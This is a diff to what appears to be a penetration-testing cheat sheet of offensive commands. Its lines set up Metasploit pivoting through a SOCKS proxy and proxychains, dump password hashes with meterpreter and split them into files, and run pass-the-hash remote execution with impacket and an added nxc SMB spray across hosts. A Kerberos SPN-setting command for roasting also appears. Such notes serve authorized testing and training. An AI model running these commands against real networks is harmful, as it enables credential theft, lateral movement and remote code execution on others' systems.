@@ -598,10 +598,11 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 run post/multi/manage/autoroute
 run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
 
+route
 run post/multi/manage/autoroute ACTION=delete
+jobs -v
+jobs -k 0
 
-
-run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
 cp /etc/proxychains.conf /etc/proxychains.conf.backup
 echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf ; nano /etc/proxychains.conf
 
@@ -631,9 +632,9 @@ meterpreter> hashdump
 echo 'hashdump' | cut -d ':' -f 1 > usernames
 echo 'hashdump' | cut -d ':' -f 3- | sed 's/::.*//' > hashes
 
+proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth
+
 impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
-
-
